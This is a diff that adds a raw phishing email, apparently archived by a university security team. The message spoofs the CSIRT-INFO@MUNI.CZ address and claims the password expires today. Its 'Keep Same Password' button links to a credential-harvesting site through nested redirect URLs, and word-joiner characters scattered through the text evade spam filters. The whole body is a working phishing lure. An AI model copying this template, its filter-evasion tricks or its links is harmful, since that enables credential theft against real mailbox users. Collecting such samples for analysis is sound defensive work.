@@ -1,0 +1,45 @@
+X-Muni-O365-Test:	CSIRT-INFO@MUNI.CZ,CSIRT-INFO@MUNI.CZ
+X-Spam-Level:	****
+X-Virus-Scanned:	clamav-milter 0.99.4 at minas
+MIME-Version:	1.0
+X-Filter-Version:	1.15 (minas)
+X-Virus-Status:	Clean
+X-Spam-Status:	No, score=4.7 required=5.0 tests=HTML_IMAGE_ONLY_24, HTML_IMAGE_RATIO_06,HTML_MESSAGE,MIME_HTML_ONLY,SPF_SOFTFAIL,TVD_SPACE_RATIO, URI_HEX autolearn=disabled version=3.3.2
+X-Spam-Checker-Version:	SpamAssassin 3.3.2 (2011-06-06) on minas.ics.muni.cz
+Message-ID:	<20220304124332.F514B9D1319BFF63@MUNI.CZ>
+X-Muni-Spam-Testip:	142.11.211.46
+X-Greylist:	IP, sender and recipient auto-whitelisted, not delayed by milter-greylist-4.3.9 (minas.ics.muni.cz [147.251.4.35]); Fri, 04 Mar 2022 12:43:35 +0100 (CET)
+X-Muni-Envelope-To:	CSIRT-INFO@MUNI.CZ
+From CSIRT-INFO@MUNI.CZ Fri Mar 4 12:	43:40 2022
+Komu:	CSIRT-INFO@MUNI.CZ
+X-Muni-Envelope-From:	CSIRT-INFO@MUNI.CZ
+Předmět:	MUNI.CZ Expiration/Request=43
+Received:	from minas.ics.muni.cz (minas.ics.muni.cz [147.251.4.46]) by rt.csirt.muni.cz (8.15.2/8.15.2/Debian-8+deb9u1) with ESMTP id 224BhdjP027754 for <rt-info@rt.csirt.muni.cz>; Fri, 4 Mar 2022 12:43:40 +0100
+Received:	from hwsrv-946170.hostwindsdns.com (hwsrv-946170.hostwindsdns.com [142.11.211.46 ]) by minas.ics.muni.cz (8.14.4/8.14.4/Debian-4+deb7u1) with ESMTP id 224BhYnh012817 for <CSIRT-INFO@MUNI.CZ>; Fri, 4 Mar 2022 12:43:35 +0100
+Received:	from SOTON.AC.UK (localhost [IPv6:: :1]) by hwsrv-946170.hostwindsdns.com (Postfix) with ESMTP id 21655732B for <CSIRT-INFO@MUNI.CZ>; Fri, 4 Mar 2022 11:43:33 +0000 (UTC)
+X-RT-Incoming-Encryption:	Not encrypted
+Od:	"ADMIN_NO-REPLY" <CSIRT-INFO@MUNI.CZ>
+Content-Type:	multipart/related; boundary="----=_NextPart_000_0012_CDBD8572.0758E3DE"
+Date:	04 Mar 2022 12:43:32 +0100
+X-RT-Interface:	Email
+Content-Transfer-Encoding: quoted-printable
+content-type: text/html; charset="utf-8"
+X-RT-Original-Encoding: iso-8859-1
+Content-Length: 2281
+
+<HTML><HEAD>
+<META name=GENERATOR content="MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<DIV>
+<P><img src="cid:screenshot1.png" width="325" height="115"><BR></P>
+<P><A onclick="parent.window.location.href='..\/..\/mail\/compose\/redirect;jsessionid=54BFA18E9EEF037E8452EE705960EC14-n1.lxa13a?editorAction=NEW&amp;to=rina@mag.co.id'; return false;" href="mailto:rina@mag.co.id" target=_blank>CSIRT-INFO@MUNI.CZ</A></P>
+<DIV>
+<DIV>
+<P>Th&#8288;e Pa&#8288;s&#8288;sw&#8288;ord fo&#8288;r&#8288; <A onclick="parent.window.location.href='..\/..\/mail\/compose\/redirect;jsessionid=54BFA18E9EEF037E8452EE705960EC14-n1.lxa13a?editorAction=NEW&amp;to=rina@mag.co.id'; return false;" href="mailto:rina@mag.co.id" target=_blank>CSIRT-INFO@MUNI.CZ</A>&#8288; Wi&#8288;ll Ex&#8288;pi&#8288;re T&#8288;od&#8288;ay </P>
+<DIV>u&#8288;se cu&#8288;rren&#8288;t pa&#8288;ssword to conti&#8288;nu&#8288;e for&nbsp;<A onclick="parent.window.location.href='..\/..\/mail\/compose\/redirect;jsessionid=54BFA18E9EEF037E8452EE705960EC14-n1.lxa13a?editorAction=NEW&amp;to=rina@mag.co.id'; return false;" href="mailto:rina@mag.co.id" target=_blank>CSIRT-INFO@MUNI.CZ</A> 
+<P></P>
+<A 
+onclick="parent.phx.event.mailUrlClicked('https:\/\/apc01.safelinks.protection.outlook.com\/?url=http%3A%2F%2Fw.qdje.galtaji.org%2F.cmluYUBtYWcuY28uaWQ%3D%2520%23aHR0cHM6Ly9wdXNoeS1icmFuY2hlZC1jaGF0dGVyLmdsaXRjaC5tZS8wODk3Lmh0bWwjcmluYUBtYWcuY28uaWQ%3D&amp;data=04%7C01%7Crina%40mag.co.id%7Ca65f4db3a3154ec1a25208d972a7b731%7C42701b59ea6543e5998898e49c4705dd%7C0%7C0%7C637666887807713812%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C0&amp;sdata=U8GoBXN
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;FCtJmfVkYaUX4GtFeEhiMt8kAXXZFy0HhY%2FA%3D&amp;reserved=0'); return true;" href="https://secured-a153d6.ingress-earth.easywp.com/oyl/#CSIRT-INFO@MUNI.CZ" target=_blank>
+<DIV id=m_-9216747884464960405x_Z43B style="COLOR: rgb(255,255,255); PADDING-BOTTOM: 7px; PADDING-TOP: 7px; PADDING-LEFT: 7px; DISPLAY: inline-block; PADDING-RIGHT: 7px; BACKGROUND-COLOR: blue">
+<DIV>Ke&#8288;e&#8288;p Sa&#8288;me&#8288; Pa&#8288;ss&#8288;wor&#8288;d&#8288;<DEL> </DEL></DIV></DIV></A></DIV></DIV></DIV></DIV></BODY></HTML>
